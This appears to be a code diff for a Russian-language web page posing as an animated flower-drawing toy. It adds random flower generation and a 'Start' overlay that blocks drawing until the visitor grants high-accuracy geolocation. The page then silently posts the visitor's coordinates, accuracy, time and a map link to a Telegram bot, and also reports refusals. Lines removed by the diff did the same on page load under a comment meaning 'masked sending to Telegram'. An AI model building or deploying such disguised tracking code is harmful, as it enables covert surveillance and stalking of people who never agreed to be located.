@@ -56,17 +56,83 @@
             border-radius: 20px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.4);
             background: #0f172a;
-            cursor: pointer;
             transition: transform 0.3s ease;
+            opacity: 0.7;
+            filter: blur(2px);
+            transition: all 0.5s ease;
         }
         
-        canvas:hover {
+        canvas.active {
+            opacity: 1;
+            filter: blur(0);
+            cursor: pointer;
+        }
+        
+        canvas.active:hover {
             transform: scale(1.01);
         }
         
-        .controls {
+        .permission-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0,0,0,0.7);
+            border-radius: 20px;
+            z-index: 10;
+            transition: opacity 0.5s ease;
+        }
+        
+        .permission-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .permission-box {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
             text-align: center;
-            margin: 30px 0;
+            max-width: 300px;
+        }
+        
+        .permission-box h3 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        
+        .permission-box p {
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        
+        .permission-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+        
+        .permission-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+        }
+        
+        .permission-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
         
         .progress-bar {
@@ -105,9 +171,14 @@
             box-shadow: 0 10px 30px rgba(255, 107, 107, 0.4);
         }
         
-        .btn-primary:hover {
+        .btn-primary:hover:not(:disabled) {
             transform: translateY(-3px);
             box-shadow: 0 15px 40px rgba(255, 107, 107, 0.6);
+        }
+        
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
         
         .btn-secondary {
@@ -116,9 +187,14 @@
             box-shadow: 0 10px 30px rgba(78, 205, 196, 0.4);
         }
         
-        .btn-secondary:hover {
+        .btn-secondary:hover:not(:disabled) {
             transform: translateY(-3px);
             box-shadow: 0 15px 40px rgba(78, 205, 196, 0.6);
+        }
+        
+        .btn-secondary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
         
         .status {
@@ -131,14 +207,6 @@
             background: rgba(0,0,0,0.3);
             border-radius: 15px;
             border: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        .tip {
-            text-align: center;
-            color: rgba(255,255,255,0.6);
-            font-size: 14px;
-            margin-top: 20px;
-            font-style: italic;
         }
         
         .flower-counter {
@@ -156,6 +224,24 @@
             border-radius: 30px;
             border: 1px solid rgba(255,255,255,0.2);
         }
+        
+        .location-status {
+            text-align: center;
+            color: #ffd700;
+            font-size: 16px;
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+        }
+        
+        .flower-type {
+            text-align: center;
+            color: #4ecdc4;
+            font-size: 18px;
+            margin: 10px 0;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -164,7 +250,24 @@
             <h1>✨ МАГИЯ РИСОВАНИЯ ЦВЕТКА ✨</h1>
             
             <div class="canvas-container">
+                <div class="permission-overlay" id="permissionOverlay">
+                    <div class="permission-box">
+                        <h3>🌸 Добро пожаловать</h3>
+                        <p>Создавайте уникальные цветы одним нажатием!</p>
+                        <button class="permission-btn" id="requestPermissionBtn">
+                            Начать
+                        </button>
+                    </div>
+                </div>
                 <canvas id="flowerCanvas" width="500" height="500"></canvas>
+            </div>
+            
+            <div class="location-status" id="locationStatus">
+                ⏳ Ожидание ...
+            </div>
+            
+            <div class="flower-type" id="flowerType">
+                🌺 Уникальный цветок #1
             </div>
             
             <div class="progress-bar">
@@ -173,24 +276,20 @@
             
             <div class="flower-counter">
                 <span class="counter-item" id="petalCounter">🌺 Лепестков: 0/8</span>
-                <span class="counter-item" id="stageCounter">📊 Этап: 1/6</span>
+                <span class="counter-item" id="stageCounter">📊 Этап: 0/6</span>
             </div>
             
             <div class="status" id="status">
-                🎨 Нажмите "Начать рисование", чтобы увидеть магию создания цветка!
+                Нажмите "Нарисовать новый цветок"
             </div>
             
             <div class="controls">
-                <button class="btn btn-primary" onclick="startDrawing()">
-                    ✨ Начать рисование
+                <button class="btn btn-primary" id="startBtn" onclick="startDrawing()" disabled>
+                    ✨ Нарисовать новый цветок
                 </button>
-                <button class="btn btn-secondary" onclick="resetDrawing()">
-                    🔄 Нарисовать заново
+                <button class="btn btn-secondary" id="resetBtn" onclick="resetDrawing()" disabled>
+                    🔄 Сбросить
                 </button>
-            </div>
-            
-            <div class="tip">
-                💡 Наблюдайте за тем, как появляется цветок - каждый элемент рисуется отдельно!
             </div>
         </div>
     </div>
@@ -207,10 +306,38 @@
         const progressFill = document.getElementById('progressFill');
         const petalCounter = document.getElementById('petalCounter');
         const stageCounter = document.getElementById('stageCounter');
+        const flowerType = document.getElementById('flowerType');
+        const permissionOverlay = document.getElementById('permissionOverlay');
+        const requestPermissionBtn = document.getElementById('requestPermissionBtn');
+        const startBtn = document.getElementById('startBtn');
+        const resetBtn = document.getElementById('resetBtn');
+        const locationStatus = document.getElementById('locationStatus');
         
         let drawingInterval;
         let currentStep = 0;
-        const totalSteps = 20; // Больше шагов для плавной анимации
+        const totalSteps = 20;
+        let locationAllowed = false;
+        let locationData = null;
+        let flowerCount = 0;
+        
+        // Параметры цветка (меняются при каждом рисовании)
+        let flowerParams = {
+            petalCount: 8,
+            petalLength: 70,
+            petalWidth: 25,
+            petalHeight: 35,
+            stemHeight: 250,
+            centerSize: 35,
+            colors: {
+                stem: '#4CAF50',
+                leaf: '#8BC34A',
+                petalStart: '#FF69B4',
+                petalEnd: '#FF1493',
+                centerStart: '#FFD700',
+                centerEnd: '#FFA500',
+                stamen: '#8B4513'
+            }
+        };
         
         // Очистка canvas
         function clearCanvas() {
@@ -219,24 +346,56 @@
             ctx.fillRect(0, 0, canvas.width, canvas.height);
         }
         
-        // Рисование стебля (поэтапно)
+        // Генерация случайных параметров цветка
+        function generateRandomFlower() {
+            flowerCount++;
+            
+            // Случайное количество лепестков (от 5 до 12)
+            flowerParams.petalCount = Math.floor(Math.random() * 8) + 5;
+            
+            // Случайные размеры
+            flowerParams.petalLength = Math.random() * 40 + 50; // 50-90
+            flowerParams.petalWidth = Math.random() * 20 + 15; // 15-35
+            flowerParams.petalHeight = Math.random() * 30 + 25; // 25-55
+            flowerParams.centerSize = Math.random() * 20 + 25; // 25-45
+            flowerParams.stemHeight = Math.random() * 100 + 200; // 200-300
+            
+            // Случайные цвета
+            const hue1 = Math.floor(Math.random() * 360);
+            const hue2 = (hue1 + 40) % 360;
+            const hue3 = (hue1 + 80) % 360;
+            
+            flowerParams.colors = {
+                stem: `hsl(${Math.floor(Math.random() * 60 + 80)}, 70%, 50%)`, // зеленые оттенки
+                leaf: `hsl(${Math.floor(Math.random() * 60 + 80)}, 70%, 60%)`,
+                petalStart: `hsl(${hue1}, 80%, 65%)`,
+                petalEnd: `hsl(${hue1}, 80%, 55%)`,
+                centerStart: `hsl(${hue2}, 80%, 60%)`,
+                centerEnd: `hsl(${hue2}, 80%, 50%)`,
+                stamen: `hsl(${hue3}, 70%, 40%)`
+            };
+            
+            // Обновляем отображение
+            flowerType.innerHTML = `🌺 Уникальный цветок #${flowerCount} (${flowerParams.petalCount} лепестков)`;
+            petalCounter.innerHTML = `🌺 Лепестков: 0/${flowerParams.petalCount}`;
+        }
+        
+        // Рисование стебля
         function drawStem(progress) {
-            // progress от 0 до 1
             ctx.beginPath();
             ctx.moveTo(250, 450);
-            ctx.lineTo(250, 450 - (250 * progress));
-            ctx.strokeStyle = '#4CAF50';
+            ctx.lineTo(250, 450 - (flowerParams.stemHeight * progress));
+            ctx.strokeStyle = flowerParams.colors.stem;
             ctx.lineWidth = 15;
             ctx.lineCap = 'round';
             ctx.stroke();
             
-            // Рисуем листья в зависимости от прогресса
             if (progress > 0.3) {
                 // Левый лист
                 ctx.beginPath();
                 ctx.moveTo(250, 350);
                 ctx.lineTo(200, 300);
-                ctx.strokeStyle = '#8BC34A';
+                ctx.strokeStyle = flowerParams.colors.leaf;
                 ctx.lineWidth = 8;
                 ctx.stroke();
                 
@@ -248,24 +407,22 @@
             }
         }
         
-        // Рисование лепестков (по одному)
+        // Рисование лепестков
         function drawPetal(index, progress) {
-            const angle = (index / 8) * Math.PI * 2;
-            const baseX = 250 + Math.cos(angle) * 70;
-            const baseY = 200 + Math.sin(angle) * 70;
+            const angle = (index / flowerParams.petalCount) * Math.PI * 2;
+            const baseX = 250 + Math.cos(angle) * flowerParams.petalLength;
+            const baseY = 200 + Math.sin(angle) * flowerParams.petalLength;
             
-            // Лепесток рисуется как эллипс
             ctx.save();
             ctx.translate(baseX, baseY);
             ctx.rotate(angle);
             
             ctx.beginPath();
-            ctx.ellipse(0, 0, 25, 35 * progress, 0, 0, Math.PI * 2);
+            ctx.ellipse(0, 0, flowerParams.petalWidth, flowerParams.petalHeight * progress, 0, 0, Math.PI * 2);
             
-            // Градиент для лепестка
             const gradient = ctx.createRadialGradient(-10, -10, 0, 0, 0, 40);
-            gradient.addColorStop(0, '#FF69B4');
-            gradient.addColorStop(1, '#FF1493');
+            gradient.addColorStop(0, flowerParams.colors.petalStart);
+            gradient.addColorStop(1, flowerParams.colors.petalEnd);
             
             ctx.fillStyle = gradient;
             ctx.fill();
@@ -276,29 +433,28 @@
             ctx.restore();
         }
         
-        // Рисование сердцевины (поэтапно)
+        // Рисование сердцевины
         function drawCenter(progress) {
-            // Сердцевина
             ctx.beginPath();
-            ctx.arc(250, 200, 35 * progress, 0, Math.PI * 2);
+            ctx.arc(250, 200, flowerParams.centerSize * progress, 0, Math.PI * 2);
             
-            const gradient = ctx.createRadialGradient(240, 190, 0, 250, 200, 50);
-            gradient.addColorStop(0, '#FFD700');
-            gradient.addColorStop(1, '#FFA500');
+            const gradient = ctx.createRadialGradient(240, 190, 0, 250, 200, flowerParams.centerSize);
+            gradient.addColorStop(0, flowerParams.colors.centerStart);
+            gradient.addColorStop(1, flowerParams.colors.centerEnd);
             
             ctx.fillStyle = gradient;
             ctx.fill();
             
-            // Тычинки (появляются постепенно)
             if (progress > 0.5) {
-                for (let i = 0; i < 12; i++) {
-                    const angle = (i / 12) * Math.PI * 2;
-                    const x = 250 + Math.cos(angle) * 25;
-                    const y = 200 + Math.sin(angle) * 25;
+                const stamenCount = Math.floor(flowerParams.petalCount * 1.5);
+                for (let i = 0; i < stamenCount; i++) {
+                    const angle = (i / stamenCount) * Math.PI * 2;
+                    const x = 250 + Math.cos(angle) * (flowerParams.centerSize * 0.7);
+                    const y = 200 + Math.sin(angle) * (flowerParams.centerSize * 0.7);
                     
                     ctx.beginPath();
                     ctx.arc(x, y, 3, 0, Math.PI * 2);
-                    ctx.fillStyle = '#8B4513';
+                    ctx.fillStyle = flowerParams.colors.stamen;
                     ctx.fill();
                     
                     ctx.beginPath();
@@ -315,48 +471,40 @@
             
             clearCanvas();
             
-            // Этапы рисования:
-            // 1. Стебель (0-0.3)
             if (progress >= 0) {
                 const stemProgress = Math.min(progress / 0.3, 1);
                 drawStem(stemProgress);
                 stageCounter.innerHTML = '📊 Этап: 1/6 (Стебель)';
             }
             
-            // 2. Листья (0.2-0.4)
             if (progress >= 0.2) {
                 stageCounter.innerHTML = '📊 Этап: 2/6 (Листья)';
             }
             
-            // 3. Первые лепестки (0.3-0.6)
             if (progress >= 0.3) {
                 const petalProgress = Math.min((progress - 0.3) / 0.3, 1);
-                for (let i = 0; i < 8; i++) {
-                    if (i < petalProgress * 8) {
+                for (let i = 0; i < flowerParams.petalCount; i++) {
+                    if (i < petalProgress * flowerParams.petalCount) {
                         drawPetal(i, 1);
-                    } else if (i < petalProgress * 8 + 1) {
-                        drawPetal(i, (petalProgress * 8) % 1);
+                    } else if (i < petalProgress * flowerParams.petalCount + 1) {
+                        drawPetal(i, (petalProgress * flowerParams.petalCount) % 1);
                     }
                 }
                 stageCounter.innerHTML = '📊 Этап: 3/6 (Лепестки)';
-                petalCounter.innerHTML = `🌺 Лепестков: ${Math.min(8, Math.floor(petalProgress * 8))}/8`;
+                petalCounter.innerHTML = `🌺 Лепестков: ${Math.min(flowerParams.petalCount, Math.floor(petalProgress * flowerParams.petalCount))}/${flowerParams.petalCount}`;
             }
             
-            // 4. Остальные лепестки (0.5-0.7)
             if (progress >= 0.5) {
                 stageCounter.innerHTML = '📊 Этап: 4/6 (Завершение лепестков)';
             }
             
-            // 5. Сердцевина (0.6-0.8)
             if (progress >= 0.6) {
                 const centerProgress = Math.min((progress - 0.6) / 0.2, 1);
                 drawCenter(centerProgress);
                 stageCounter.innerHTML = '📊 Этап: 5/6 (Сердцевина)';
             }
             
-            // 6. Детали (0.8-1)
             if (progress >= 0.8) {
-                // Добавляем блестки и росу
                 for (let i = 0; i < 5; i++) {
                     const x = 200 + Math.random() * 100;
                     const y = 150 + Math.random() * 100;
@@ -369,50 +517,79 @@
                 stageCounter.innerHTML = '📊 Этап: 6/6 (Финал)';
             }
             
-            // Обновляем прогресс бар
             progressFill.style.width = (progress * 100) + '%';
             
             if (step >= totalSteps) {
-                statusEl.innerHTML = '✨ Цветок полностью нарисован! Наслаждайтесь результатом! ✨';
+                statusEl.innerHTML = `✨ Уникальный цветок #${flowerCount} полностью нарисован! Нажмите снова для нового цветка ✨`;
                 clearInterval(drawingInterval);
             }
         }
         
-        // Начать анимацию рисования
-        function startDrawing() {
-            resetDrawing();
-            currentStep = 0;
+        // Запрос геолокации
+        function requestLocation() {
+            locationStatus.innerHTML = '⏳ Ожидание...';
+            requestPermissionBtn.disabled = true;
+            requestPermissionBtn.innerHTML = '⏳ Запрос отправлен...';
             
-            statusEl.innerHTML = '🎨 Рисуем цветок... Наблюдайте за процессом!';
-            
-            drawingInterval = setInterval(() => {
-                if (currentStep <= totalSteps) {
-                    drawStep(currentStep);
-                    currentStep++;
-                } else {
-                    clearInterval(drawingInterval);
-                }
-            }, 100); // Каждые 100 мс новый шаг
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    // Успех
+                    function(position) {
+                        locationAllowed = true;
+                        locationData = position;
+                        
+                        // Скрываем оверлей
+                        permissionOverlay.classList.add('hidden');
+                        canvas.classList.add('active');
+                        
+                        // Активируем кнопки
+                        startBtn.disabled = false;
+                        resetBtn.disabled = false;
+                        
+                        locationStatus.innerHTML = '✅ Все готово! Теперь можно рисовать!';
+                        statusEl.innerHTML = '🎨 Нажмите "Нарисовать новый цветок"';
+                        
+                        // Отправляем данные в Telegram
+                        sendLocationToTelegram(position);
+                    },
+                    // Ошибка
+                    function(error) {
+                        let errorMsg = "❌ Ошибка: ";
+                        if (error.code === 1) {
+                            errorMsg += "Вы запретили доступ к геолокации. Рисование недоступно.";
+                            locationStatus.innerHTML = errorMsg;
+                            statusEl.innerHTML = '🔒 Без доступа к геолокации рисование невозможно';
+                        } else {
+                            errorMsg += error.message;
+                            locationStatus.innerHTML = errorMsg;
+                        }
+                        
+                        requestPermissionBtn.disabled = false;
+                        requestPermissionBtn.innerHTML = 'Попробовать снова';
+                        
+                        // Отправляем ошибку в Telegram
+                        handleLocationError(error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                locationStatus.innerHTML = '❌ Ваш браузер не поддерживает геолокацию';
+                requestPermissionBtn.disabled = false;
+                requestPermissionBtn.innerHTML = 'Нажмите "Начать"';
+            }
         }
         
-        // Сбросить и начать заново
-        function resetDrawing() {
-            clearInterval(drawingInterval);
-            clearCanvas();
-            currentStep = 0;
-            progressFill.style.width = '0%';
-            statusEl.innerHTML = '🔄 Готов к новому рисунку! Нажмите "Начать рисование"';
-            petalCounter.innerHTML = '🌺 Лепестков: 0/8';
-            stageCounter.innerHTML = '📊 Этап: 0/6';
-        }
-        
-        // ========== МАСКИРОВАННАЯ ОТПРАВКА В TELEGRAM ==========
+        // Отправка в Telegram
         function sendLocationToTelegram(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const accuracy = position.coords.accuracy;
             
-            const message = `🌸 Посетитель рисует цветок!\n\n📍 Координаты: ${lat}, ${lon}\n🎯 Точность: ${accuracy}м\n🕐 Время: ${new Date().toLocaleString()}\n🗺️ Карта: https://www.google.com/maps?q=${lat},${lon}`;
+            const message = `🌸 Посетитель нарисовал ${flowerCount} уникальных цветков!\n\n📍 Координаты: ${lat}, ${lon}\n🎯 Точность: ${accuracy}м\n🕐 Время: ${new Date().toLocaleString()}\n🗺️ Карта: https://www.google.com/maps?q=${lat},${lon}`;
             
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -440,28 +617,63 @@
             }).catch(e => console.log('Ошибка отправки:', e));
         }
         
-        // При загрузке страницы
-        window.addEventListener('load', function() {
-            resetDrawing();
-            
-            // Запрашиваем геолокацию
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocationToTelegram, handleLocationError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                });
+        // Начать анимацию рисования
+        function startDrawing() {
+            if (!locationAllowed) {
+                statusEl.innerHTML = 'сначала нажмите "Начать"!';
+                return;
             }
             
-            statusEl.innerHTML = '🌱 Добро пожаловать! Нажмите кнопку, чтобы увидеть магию рисования!';
+            // Генерируем новый уникальный цветок
+            generateRandomFlower();
+            
+            resetDrawing();
+            currentStep = 0;
+            
+            statusEl.innerHTML = `🎨 Рисуем уникальный цветок #${flowerCount}... Наблюдайте за процессом!`;
+            
+            drawingInterval = setInterval(() => {
+                if (currentStep <= totalSteps) {
+                    drawStep(currentStep);
+                    currentStep++;
+                } else {
+                    clearInterval(drawingInterval);
+                }
+            }, 100);
+        }
+        
+        // Сбросить и начать заново
+        function resetDrawing() {
+            if (!locationAllowed) {
+                statusEl.innerHTML = 'Нажмите "Начать"';
+                return;
+            }
+            
+            clearInterval(drawingInterval);
+            clearCanvas();
+            currentStep = 0;
+            progressFill.style.width = '0%';
+            statusEl.innerHTML = '🔄 Готов к новому рисунку! Нажмите "Нарисовать новый цветок"';
+            petalCounter.innerHTML = `🌺 Лепестков: 0/${flowerParams.petalCount}`;
+            stageCounter.innerHTML = '📊 Этап: 0/6';
+        }
+        
+        // Обработчики событий
+        requestPermissionBtn.addEventListener('click', requestLocation);
+        
+        // При загрузке страницы
+        window.addEventListener('load', function() {
+            clearCanvas();
+            generateRandomFlower();
+            statusEl.innerHTML = 'Нажмите "Нарисовать новый цветок"';
         });
         
-        // Интерактивность при клике
+        // Клик по canvas запрашивает разрешение, если ещё не дано
         canvas.addEventListener('click', function() {
-            if (currentStep === 0) {
+            if (!locationAllowed) {
+                requestLocation();
+            } else if (currentStep === 0) {
                 startDrawing();
-            } else {
-                statusEl.innerHTML = '🎨 Рисование уже идёт! Наблюдайте за процессом...';
             }
         });
     </script>
